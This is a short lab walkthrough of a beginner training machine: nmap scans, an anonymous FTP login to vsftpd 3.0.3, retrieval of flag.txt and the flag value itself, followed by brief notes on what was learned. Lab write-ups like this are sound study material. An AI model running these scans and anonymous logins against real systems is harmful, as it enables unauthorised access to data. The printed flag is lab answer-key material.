
# Machine Fawn — Tier 0

**Concept :** File Transfer Protocol and exploitation
**Date :** 15 march 2026

## What I did

nmap on the machine

```bash
Nmap scan report for 10.129.20.231
Host is up (0.30s latency).
Not shown: 974 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
21/tcp    open     ftp
[...]
```

Scanning which version of FTP is installed :

```bash
> nmap -sV -p 21 10.129.20.231
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-15 11:54 -03
Nmap scan report for 10.129.20.231
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.69 seconds

```

FTP login without account : `anonymous`

```bash
> ftp anonymous@10.129.20.231
Connected to 10.129.20.231.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Login successful : `230`

```bash
ftp> ls
229 Entering Extended Passive Mode (|||19023|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

Download the file on the server : `get`
```bash
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||59027|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************|    32      271.73 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.08 KiB/s)

```

The file is downloaded on our machine, where the ftp command was started.

```bash
> cat flag.txt
035db21c881520061c53e0536e44f815

```    

## What I learned
I learned to start a FTP connection and connect as anonymous and transfer a file.
If the FTP is misconfigured, nothing is encrypted.